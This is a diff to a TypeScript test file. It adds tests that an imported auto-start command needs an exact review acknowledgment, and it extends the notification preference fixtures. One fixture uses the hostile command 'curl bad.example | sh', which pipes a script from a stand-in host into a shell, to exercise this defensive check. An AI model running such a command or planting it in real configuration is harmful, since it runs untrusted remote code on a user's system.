@@ -10,7 +10,7 @@ beforeEach(() => {
   testDb = createTestDb().db
 })
 
-import { applyImport } from './applyImport'
+import { applyImport, requiresAutoStartReview } from './applyImport'
 import { listAllJobs } from '../db/repositories/jobsRepository'
 import { listAllExclusions, isUrlExcluded } from '../db/repositories/jobExclusionsRepository'
 import { listAllIndexedJobs, upsertIndexedJobs } from '../db/repositories/indexedJobsRepository'
@@ -157,6 +157,21 @@ describe('applyImport — indexed jobs', () => {
 })
 
 describe('applyImport', () => {
+  it('requires an exact review acknowledgment for a selected imported auto-start command', () => {
+    const source = bundle({ settings: { autoStartCommand: 'curl bad.example | sh', indexedJobsRetentionDays: 30 } })
+    const selected = { ...NO_SELECTION, settings: true }
+
+    expect(requiresAutoStartReview(source, selected, undefined)).toBe(true)
+    expect(requiresAutoStartReview(source, selected, 'different command')).toBe(true)
+    expect(requiresAutoStartReview(source, selected, 'curl bad.example | sh')).toBe(false)
+    expect(requiresAutoStartReview(source, NO_SELECTION, undefined)).toBe(false)
+  })
+
+  it('does not require review for the disabled auto-start setting', () => {
+    const source = bundle({ settings: { autoStartCommand: '', indexedJobsRetentionDays: 30 } })
+    expect(requiresAutoStartReview(source, { ...NO_SELECTION, settings: true }, undefined)).toBe(false)
+  })
+
   it('imports jobs when selected and present, reporting counts', () => {
     const result = applyImport(bundle({ jobs: [jobFixture] }), { ...NO_SELECTION, jobs: true })
     expect(result.jobs).toEqual({ imported: 1, skipped: 0 })
@@ -193,7 +208,13 @@ describe('applyImport', () => {
         settings: {
           autoStartCommand: 'claude',
           indexedJobsRetentionDays: 14,
-          notificationPreferences: { enabled: false, verificationRequired: true, jobFilled: false, jobFailed: true }
+          notificationPreferences: {
+            enabled: false,
+            verificationRequired: true,
+            permissionRequired: false,
+            jobFilled: false,
+            jobFailed: true
+          }
         }
       }),
       { ...NO_SELECTION, settings: true }
@@ -204,6 +225,7 @@ describe('applyImport', () => {
     expect(getNotificationPreferences()).toEqual({
       enabled: false,
       verificationRequired: true,
+      permissionRequired: false,
       jobFilled: false,
       jobFailed: true
     })
